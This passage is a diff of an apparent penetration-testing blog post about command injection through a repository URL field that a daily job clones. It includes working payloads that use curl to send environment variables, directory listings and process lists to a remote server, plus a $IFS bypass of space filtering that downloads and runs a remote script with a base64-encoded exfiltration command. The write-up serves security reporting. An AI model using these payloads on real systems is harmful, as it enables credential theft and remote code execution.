@@ -28,9 +28,9 @@ By analyzing the full command in the stack trace and reviewing the decompiled co
 
 Once I understood the conditions required for successful injection, I crafted a payload that cloned my GitHub repository and executed a **curl** command to exfiltrate environment variables to a server I controlled. The daily job ran the payload early the next morning while I was asleep. After reviewing the results, I documented the vulnerability and prepared the report for the customer.
 
-<pre>
+```
 "main" https://github.com/:myGitHubUser/test .; curl -X POST -d "`printenv && ls -la /redacted && ps -aux`" "https://remoteserver.com/"
-</pre>
+```
 
 <figure>
   <img src="/assets/img/2025/rce-env-vars.png">
@@ -42,9 +42,9 @@ Months later, when I had the opportunity to retest the application, I began by r
 
 The repository URL field enforced input validation that disallowed spaces and required the string to begin with **https**. While researching potential bypass techniques, I came across the Linux shell's Internal Field Separator (IFS) variable, which can be used to substitute spaces in command injection scenarios. After several days of testing—limited by the application's once-daily job execution—I eventually crafted a working payload that successfully bypassed the restrictions and achieved code execution.
 
-<pre>
+```
 https://github.com/:myGitHubUser/test;curl$IFS$1-s$IFS$1'https://gist.githubusercontent.com/:myGitHubUser/:uuid/raw/:uuid/test.sh'$IFS$1-o$IFS$1'/tmp/test.sh';/bin/sh$IFS$1/tmp/test.sh$IFS$1Y3VybCAtZCAiYHByaW50ZW52ICYmIGxzIC1sYSAvcmVkYWN0ZWQvZ2xvYmFsLyAmJiBwcyAtYXV4YCIgaHR0cHM6Ly9leGFtcGxlLmNvbQ;echo$IFS$1
-</pre>
+```
 
 The payload cloned my repository, executed a **curl** command to download a shell script onto the server, and then ran the script with a base64-encoded input string containing OS commands to be executed on the server.
 
